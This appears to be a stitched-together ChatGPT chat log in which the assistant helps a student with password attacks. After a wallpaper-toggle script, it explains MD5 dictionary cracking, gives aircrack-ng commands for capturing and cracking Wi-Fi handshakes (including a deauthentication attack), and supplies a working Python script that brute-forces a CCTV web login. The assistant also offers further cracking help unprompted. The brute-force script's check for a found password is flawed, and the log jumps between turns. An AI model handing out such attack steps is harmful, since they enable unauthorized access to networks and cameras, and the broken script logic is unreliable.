🧩 Option 2: AutoHotKey Script (Free – Advanced Setup)

You can create a hotkey or mouse gesture to swap between two wallpapers.

Example script:

ahk
; Save this as wallpaper_toggle.ahk and run it
; Press Ctrl+Alt+W to toggle wallpapers

wallpaper1 := "C:\\Wallpapers\\normal.jpg"
wallpaper2 := "C:\\Wallpapers\\private.jpg"
global current := 1

^!w:: ; Ctrl + Alt + W
    if (current = 1) {
        Run, powershell -command "Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop\\' -Name wallpaper -Value '%wallpaper2%' ; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"
        current := 2
    } else {
        Run, powershell -command "Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop\\' -Name wallpaper -Value '%wallpaper1%' ; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"
        current := 1
    }
return

  • Use Ctrl + Alt + W to toggle wallpapers.

You said:
what is the target hash means
ChatGPT said:

Great question! Let’s break it down clearly:

🔐 What is a Target Hash?

The target hash is the hashed version of the password you're trying to crack.

🧠 Example

Let’s say someone’s real password is:

nginx
mypassword

But systems usually don’t store passwords in plain text. They store a hash (a scrambled version) like this:

34819d7beeabb9260a5c854bc85b3e44

That is the MD5 hash of "mypassword".

So in your script:

python
target_hash = "34819d7beeabb9260a5c854bc85b3e44"

You're telling the program:
💬 “This is the hash. Try to find out which password matches it from the wordlist.”

🔁 What Your Code Does:

  1. Reads each word from the wordlist.

  2. Converts it to a hash.

  3. Compares it with the target_hash.

  4. If it matches → Password is found!

🧪 How to Find the Hash of Your Own Password (for testing)

You can generate it in Python like this:

python
import hashlib
print(hashlib.md5("mypassword".encode()).hexdigest())

Replace "mypassword" with anything you like.

Let me know if you want to try SHA-1, SHA-256, or learn how to crack zip file passwords too!

You said:
so what if it has a password with 8 characters lower case upper case and also special characters is it will be cracked by this
ChatGPT said:

Great follow-up! Here's the truth: cracking a password that is 8 characters long with uppercase, lowercase, numbers, and special characters is very hard using only a simple dictionary attack (like your current script). Here's why:

🔐 Why It’s Hard to Crack Strong Passwords

🎯 Example:

Let’s say the password is:

bash
A9$kLm!q

If this password is:

  • Not in your wordlist (like rockyou.txt)

  • And randomly generated

Then a dictionary attack will fail unless the exact match exists in the wordlist.

🧠 Let’s Look at the Numbers:

If you want to brute-force all possible 8-character passwords using:

  • Uppercase (A–Z): 26

  • Lowercase (a–z): 26

  • Numbers (0–9): 10

  • Special chars (like !@#$%^&*): ~10

Possible combinations:

(26 + 26 + 10 + 10)^8 = 72^8 ≈ 722 trillion combinations

😱 That's 722,204,136,308,736 combinations
⏳ It would take years or decades on a normal PC

✅ So What Can You Do?

1. Dictionary attack

  • Works only if the password is common or reused.

  • Can’t guess random ones like #Lp8Aq!b.

2. Brute-force attack

  • Tries all possible combinations.

  • Takes a long time, especially on strong passwords.

  • Tools like Hashcat or John the Ripper do this better (GPU-based).

3. Hybrid attack

  • Combines a dictionary with rules (e.g., adds numbers or symbols).

  • More effective than raw brute-force.

🧪 In Your Case (Student Project):

Your Python cracker can:

  • Crack weak passwords easily (e.g., "hello123", "admin", "password")

  • Demonstrate why strong passwords are important

  • Be a great learning example

💡 Final Advice

If you want to show:

  • Cracking success → Use known weak passwords like "mypassword", "123456", etc.

  • Why strong passwords win → Try random ones and show how the script fails to crack it

That contrast will impress your teacher!

📡 How Wi-Fi Password Cracking Actually Works

Cracking Wi-Fi (WPA/WPA2) is very different from simple password hash cracking.

Here are the real steps used (only on your own test network):

🧰 Tools You Need:

  1. A Linux system (Kali Linux is best)

  2. A Wi-Fi adapter that supports monitor mode

  3. Tools like:

    • airmon-ng

    • airodump-ng

    • aireplay-ng

    • aircrack-ng

    • Wordlist (e.g., rockyou.txt)

⚙️ Basic Steps to Crack Your Own Wi-Fi:

  1. Put Wi-Fi adapter in monitor mode:

    sql
    sudo airmon-ng start wlan0

  2. Capture handshake:

    nginx
    sudo airodump-ng wlan0mon

    • Find your Wi-Fi network (BSSID + channel)

    • Then:

      php-template
      sudo airodump-ng -c <channel> --bssid <router_bssid> -w capture wlan0mon

  3. Force a device to reconnect (capture handshake):

    css
    sudo aireplay-ng -0 10 -a <router_bssid> wlan0mon

  4. Crack the handshake with wordlist:

    css
    aircrack-ng -w rockyou.txt -b <router_bssid> capture-01.cap

Cool! You want to build a Python brute-force login script that tries passwords from a wordlist against a CCTV login page (HTTP login) using Kali Linux.

Here’s a step-by-step beginner-friendly guide to do that legally on your own CCTV or any test web login:

Step 1: Get the CCTV IP/login URL

  • You need the IP address of your CCTV or local test web login URL.

  • Example: http://192.168.1.100/login or http://localhost/login

Step 2: Check how the login works

  • Open the login page in your browser.

  • Use browser DevTools (Right-click → Inspect → Network tab).

  • Try logging in with any password.

  • See what HTTP request is sent (usually POST request with username & password fields).

  • Note:

    • The URL of the POST request

    • The field names for username and password (e.g., username, password or user, pass)

Step 3: Prepare your Python brute-force script

Here’s a simple Python script using requests library that tries passwords from a wordlist file:

python
import requests

url = 'http://192.168.1.100/login'  # Change this to your CCTV login URL
username = 'admin'  # Change if your username is different

# The form data keys might be different on your device. Change them accordingly.
password_field_name = 'password'  # usually 'password' or 'pass'
username_field_name = 'username'  # usually 'username' or 'user'

wordlist_file = 'passwords.txt'  # Your wordlist file

with open(wordlist_file, 'r') as file:
    for line in file:
        password = line.strip()
        data = {
            username_field_name: username,
            password_field_name: password
        }
        response = requests.post(url, data=data)

        # Adjust this condition to detect successful login
        if "logout" in response.text.lower() or response.status_code == 200:
            print(f"[+] Password found: {password}")
            break
        else:
            print(f"[-] Tried password: {password}")

Step 4: Prepare wordlist

  • Use rockyou.txt or any text file with possible passwords.

  • Make sure it’s in the same folder or give full path in the script.

Step 5: Run your script in Kali

  1. Save your script, e.g., bruteforce_cctv.py.

  2. Open terminal and run:

    bash
    python3 bruteforce_cctv.py

Step 6: Interpret output

  • The script prints tried passwords.

  • When password is found, it prints [+] Password found: ...
